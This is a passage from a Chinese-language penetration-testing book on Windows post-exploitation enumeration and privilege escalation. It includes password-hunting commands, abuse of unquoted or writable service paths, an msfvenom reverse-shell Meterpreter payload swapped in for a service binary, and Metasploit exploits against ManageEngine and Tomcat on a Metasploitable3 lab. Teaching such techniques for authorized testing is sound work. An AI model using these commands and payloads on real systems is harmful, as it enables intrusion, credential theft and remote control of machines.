服务，并寻找杀毒软件或其他主机基础保护。下面是一些我们最初可能运行的其他示例命
令：
网络信息:
netstat -anop | findstr LISTEN
net group “Domain Admins” /domain
流程列表:
tasklist /v
系统主机信息:
sysinfo
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv
c:\temp\os.txt
wmic qfe get Caption，Description，HotFixID，InstalledOn
简单的文件搜索:
dir /s password
115
第4章 带球——开始攻击网络
findstr /s /n /i /p foo *
findstr /si pass .txt | .xml | *.ini
来自共享/挂载驱动器的信息:
powershell -Command “get-WmiObject -class Win32_Share”
powershell -Command “get-PSDrive”
powershell -Command “Get-WmiObject -Class Win32_MappedLogicalDisk | select
Name， ProviderName”
让我们现实一点，没有人有时间记住所有的命令，但是我们很幸运！我相信，我相信我们可
以在一个名为 RTFM.py 的工具中轻松搜索到这些命令，这是 @leostat 基于 RTFM 书籍(很棒
的资源)创建的一个快速查询的 Python 脚本，其中包含大量这些方便的命令。
更新并运行 RTFM
cd /opt/rtfm
chmod +x rtfm.py
./rtfm.py -u
./rtfm.py -c ‘rtfm’
搜索所有标签
./rtfm.py -Dt
查看每个标记的所有查询/命令。我喜欢用的一个是枚举类
./rtfm.py -t enumeration | more
116
第4章 带球——开始攻击网络
现在，RTFM 非常广泛，有许多不同的有用命令。这是一个不断快速更新的优秀的资源。
这些都是我们为了获取信息而一直在做的事情，但是如果我们能从环境中获得更多呢？使用
PowerShell，我们可以获得所需的网络和环境信息。任何支持 C2 的工具都能轻松执行
PowerShell ，因此可以使用 Empire、Metasploit 或 Cobalt Strike 来执行这些操作。在下面的
例子中，我们将使用 Empire ，你也可以尝试其他工具。
权限提升
从普通用户到高权限帐户有很多不同的方式。
未被引用服务路径:
这是一个相当简单和常见的漏洞，其中服务可执行路径没有被引号括起来。这是很容易
被利用的，因为如果路径周围没有引号，我们就会利用当前服务。假设我们有一个服务
被配置为执行 C:\Program Files (x86)\Cyber Kittens\Cyber Kittens.exe。如果我们有 CK
文件夹的写入权限，我们可以将其替换为 C:\Program Files (x86)\Cyber
Kittens\Cyber.exe（注意，原名称中的 Kittens.exe 消失了）的恶意软件。如果服务在系
统上运行，我们可以等到服务重新启动，并让我们的恶意软件作为一个 帐户运
system
行。
如何找到易受攻击的服务路径:
通过 wmic 服务获取名称、注意 displayname、pathname、startmode |findstr /i
"Auto" |findstr /i /v "C:\Windows\" | findstr /i /v """
寻找 BINARY_PATH_NAME
查找服务中存在的不安全的注册表权限:
识别允许更新服务映像路径位置的弱权限账户
检查 AlwaysInstallElevated 注册表项是否已启用：
检查 AlwaysInstallElevated 注册表项，该注册表项指示.msi 文件应以较高的权限 ( NT
AUTHORITY\SYSTEM ) 安装
https://github.com/rapid7/metasploit-
framework/blob/master/modules/exploits/windows/local/always_install_elevated.rb
请注意，我们并不需要手动完成这些操作，因为别人已经创建了一些好的 metasploit 和
PowerShell 模块，特别是针对 Windows 的模块。在下面的示例中，我们将查看 PowerUp
PowerShell 脚本。在这种情况下，脚本与 Empire 一起在所有常见的错误配置区域运行查
找，比如允许普通用户获得本地管理或系统帐户。在下面的示例中，我们在受害者系统上运
行这个程序，发现它有一些本地系统的未引用服务路径。现在，我们可能无法重新启动服
务，但我们应该能够利用这个漏洞，等待服务重启。
Empire PowerUp 模块:
117
第4章 带球——开始攻击网络
usermodule privesc/powerup/allchecks
最突出的是:
ServiceName： WavesSysSvc
Path： C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
ModifiableFile： C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
ModifiableFilePermissions： {WriteOwner, Delete, WriteAttributes, Synchronize…}
ModifiableFileIdentityReference： Everyone
StartName： LocalSystem
看起来任何人都可以编写 WavesSysSyc 服务。这意味着我们可以将 WaveSysSvc64.exe 文
件替换为我们自己的恶意二进制文件:
创建一个 Meterpreter 二进制文件（后续的文章将讨论如何绕过杀毒软件）
msfvenom -p windows/meterpreter/reverse_https LHOST=[ip] LPORT=8080 -f exe
> shell.exe
使用 Empire 上传二进制文件并替换原始二进制文件
upload ./shell.exe C:\users\test\shell.exe
shell copy C:\users\test\Desktop\shell.exe
“C:\ProgramFiles\Waves\MaxxAudio\WavesSysSvc64.exe”
重新启动服务或等待其重启
一旦服务重新启动，你你应该会收到一个升级为 system 权限的 Meterpreter shell 。使用
PowerUp powershell 脚本，你将发现许多不同的服务都会有权限提升的可能性。如果你想深
入了解 Windows 权限提升的底层问题，请查看 FuzzSecurity 的文
118
第4章 带球——开始攻击网络
章：http://www.fuzzysecurity.com/tutorials/16.html 。
对于未打补丁的 Windows 系统，我们确实有一些权限升级攻击，比如：（
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1 ）和 (
https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-
135 ），但是我们如何快速识别目标系统上安装了哪些补丁呢，我们可以在受害者系统上使
用系统默认自带的命令来查看安装了哪些系统补丁包。Windows 自带默认命令
systeminfo
将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将
其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性
的进行漏洞利用从而提升权限。
回到你攻击的 Windows 10系统：
systeminfo
systeminfo > windows.txt
将 windows.txt 复制到你的 Kali 虚拟机的 /opt/Windows-Exploit-Suggester 下
python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls
这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权
限提升的漏洞。
如果我们处在一个已经打好所有补丁的 Windows 主机环境中，我们将重点关注第三方软件中
的不同权限提升漏洞或操作系统的任何 0day 漏洞。例如，我们一直在寻找下面这样的漏洞
http://bit.ly/2HnX5id ，这是 Windows 中的权限升级漏洞，现在还没有修补。通常在这些场景
中，可能会有一些基本的 POC 代码，但是我们需要测试、验证并多次复现这个漏洞。我们经
常监控某些领域存在公共特权升级的漏洞：
http://insecure.org/search.html?q=privilege%20escalation
https://bugs.chromium.org/p/project-zero/issues/list?
can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&
cells=ids
通常，这只是时间问题。例如，当发现漏洞时，这可能是你在系统打好补丁之前进一步破坏
系统有限的好机会。
权限提升实验
119
第4章 带球——开始攻击网络
测试并尝试不同类型的权限升级漏洞的最佳实验环境是 Rapid7的 Metasploitable3。这个充满
漏洞的框架会自动生成一个 Windows 虚拟机，其中包含所有常见的和不常见的漏洞。配置需
要一点时间，但是一旦配置好了虚拟机，它就是一个非常棒的实验环境。
让我们来看一个简单的例子，然后快速开始：
使用 nmap 扫描 Metasploitable3 虚拟机的IP ( 确保全端口扫描免得你错过一些端口 )
你将看到 ManageEngine 在端口8383上运行
启动 Metasploit 并搜索任何 ManageEngine 有关的漏洞
msfconsole
search manageengine
use exploit/windows/http/manageengine_connectionid_write
set SSL True
set RPORT 8383
set RHOST 
exploit
getsystem
你会注意到你不能获得 权限，因为你所利用的服务未作为特权进程运行。这
system
时，你能做到的就是尝试所有不同的权限提升攻击。
其中，我们看到的一件事是，Apache Tomcat 是作为特权进程运行的。如果我们可以利
用这个服务，我们就可以将我们的 payload 作为更高层次的服务运行。我们看到 Apache
Tomcat 在外部网络的8282端口运行，但它需要用户名和密码。因为我们有一个本地低权
限的 shell，我们可以尝试在磁盘上搜索这个密码。我们可以在谷歌搜索“Tomcat密码存储
在哪里”，搜索结果表明：“tomcat-users.xml”。
在受害者机器中，我们可以搜索和读取 tomcat-users.xml 文件:
shell
cd \ && dir /s tomcat-users.xml
type “C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-
8.0.33\conf\tomcat-users.xml
现在让我们使用找到的密码攻击 Tomcat。首先，登录到8282端口上的 Tomcat 管理控制
台，并查看我们的密码是否有效。然后，我们可以使用 Metasploit 通过 Tomcat 部署恶意
的 WAR 文件。
search tomcat
use exploit/multi/http/tomcat_mgr_upload
show options
set HTTPusername sploit
set HTTPpassword sploit
set RPORT 8282
set RHOST 
set Payload java/shell_reverse_tcp
set LHOST 
120
第4章 带球——开始攻击网络
exploit